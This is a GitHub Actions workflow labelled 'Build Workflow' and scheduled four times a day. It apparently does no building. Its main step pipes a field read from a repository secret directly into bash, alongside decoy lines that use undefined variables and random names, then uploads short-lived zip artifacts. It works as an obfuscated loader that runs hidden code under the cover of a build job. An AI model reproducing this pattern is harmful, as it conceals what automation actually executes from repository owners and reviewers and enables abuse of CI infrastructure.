name: Build Workflow
on:
  workflow_dispatch:

  schedule:
    - cron: '51 1,7,13,19 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  job:
    name: Go
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          x041: ${{ secrets.x041 }}
        run: |
          printf '%s' "$x041" | jq -r .zwqk44509 | /bin/bash
          printf '%s' "$pv875" | jq -r .qje0 | /bin/bash
          echo $t516 | jq -r .vy0736 | /bin/bash
          printf '%s' "$ejs672" | jq -r .r8179 | /bin/bash
          echo $xtl4481 | jq -r .jao14 | /bin/bash

      - name: Store artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: uRnLdKv1
          path: "*.zip"
          retention-days: 1
